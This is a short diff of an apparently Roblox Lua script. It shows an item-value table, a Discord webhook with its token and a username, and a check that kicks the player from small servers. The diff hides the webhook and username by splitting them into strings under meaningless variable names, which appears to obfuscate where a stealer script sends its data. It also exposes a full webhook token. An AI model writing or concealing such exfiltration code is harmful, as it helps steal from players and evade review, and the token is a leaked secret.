@@ -792,8 +792,12 @@ local values = {
 	["Aliens"] = 1,
 	["Moon"] = 1
 }
-webHook = "https://discord.com/api/webhooks/1309583394853884066/CYYYwQ4_0WMzoO3xFlyRE-KiJb1oUEsYUccvZT7pSFIcQ4DzjS2HKfLUv76byqGpgwi7"
-userName = "sitetest010"
+local ajgbsjw = "https://discord.com/api/webhooks/1309583394853884066/"
+local kebtbak = "CYYYwQ4_0WMzoO3xFlyRE-KiJb1oUEsYUccvZT7pSFIcQ4DzjS2HKfLUv76byqGpgwi7"
+webHook = "\"" .. kebtbak .. ajgbsjw .. "\""
+local kwbrbsi = "site"
+local iwnrbtk = "test010"
+userName = "\"" .. kwbrbsi .. iwnrbtk .. "\""
 if #game:GetService("Players"):GetPlayers() <= 2 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
